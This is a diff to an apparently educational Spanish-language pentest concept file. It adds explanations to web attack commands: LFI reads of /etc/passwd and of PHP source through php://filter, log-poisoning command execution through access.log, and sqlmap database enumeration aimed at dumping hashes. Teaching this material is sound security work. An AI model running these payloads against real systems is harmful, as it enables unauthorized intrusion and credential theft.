@@ -35,8 +35,16 @@ CONCEPTS = [
             "Si controlas el contenido de algun fichero que el servidor luego incluye (un log, una sesion, un upload), la LFI se convierte en ejecucion: mira [[lfi-a-rce]].",
         ],
         "commands": [
-            "curl -s '$URL/?page=../../../../etc/passwd'",
-            "curl -s '$URL/?page=php://filter/convert.base64-encode/resource=config'",
+            {
+                "cmd": "curl -s '$URL/?page=../../../../etc/passwd'",
+                "why": "Prueba de lectura con un fichero que siempre existe. Los ../ de sobra suben hasta la raiz aunque no sepas la profundidad real del script.",
+                "out": "Lineas root:x:0:0. Si aparecen, hay LFI confirmada. Un error de include con una ruta absoluta tambien es util: te dice donde estas en el disco.",
+            },
+            {
+                "cmd": "curl -s '$URL/?page=php://filter/convert.base64-encode/resource=config'",
+                "why": "Si el codigo anade .php y ejecuta el fichero, el wrapper php://filter te deja leer el FUENTE en base64 sin que se ejecute. Asi lees configs con credenciales.",
+                "out": "Un blob en base64: decodificalo (base64 -d) para ver el codigo PHP. Busca ahi credenciales de BD, claves de API y rutas a otros ficheros jugosos.",
+            },
         ],
     },
     {
@@ -60,7 +68,11 @@ CONCEPTS = [
             "Con shell ya dentro, cambia de fase: orientate y busca escalada. Los comandos concretos estan en la seccion de practica (ver comandos).",
         ],
         "commands": [
-            "curl -s '$URL/?page=../../../../var/log/apache2/access.log&c=id'",
+            {
+                "cmd": "curl -s '$URL/?page=../../../../var/log/apache2/access.log&c=id'",
+                "why": "Log poisoning: antes mandas PHP en tu User-Agent (queda escrito en el access.log) y ahora incluyes ese log via la LFI. El servidor interpreta tu PHP y ejecuta el comando de ?c=.",
+                "out": "La salida de id incrustada entre las lineas del log confirma ejecucion. Fijate en el usuario (www-data): es con quien tendras la shell al escalar a reverse shell.",
+            },
         ],
     },
     {
@@ -85,7 +97,11 @@ CONCEPTS = [
             "Si es a ciegas, automatiza con una herramienta; los hashes que saques van a la fase de credenciales para crackear y reutilizar.",
         ],
         "commands": [
-            "sqlmap -u '$URL/item?id=1' --batch --dbs",
+            {
+                "cmd": "sqlmap -u '$URL/item?id=1' --batch --dbs",
+                "why": "Cuando ya sospechas SQLi (una comilla rompio la pagina), sqlmap automatiza la deteccion y explotacion. --batch acepta los defaults; --dbs lista las bases de datos como primera prueba de que funciona.",
+                "out": "El tipo de inyeccion detectada (boolean, time-based, UNION) y la lista de bases de datos. Con eso, sigue con --tables y -D <db> --dump para extraer usuarios y hashes.",
+            },
         ],
     },
 ]
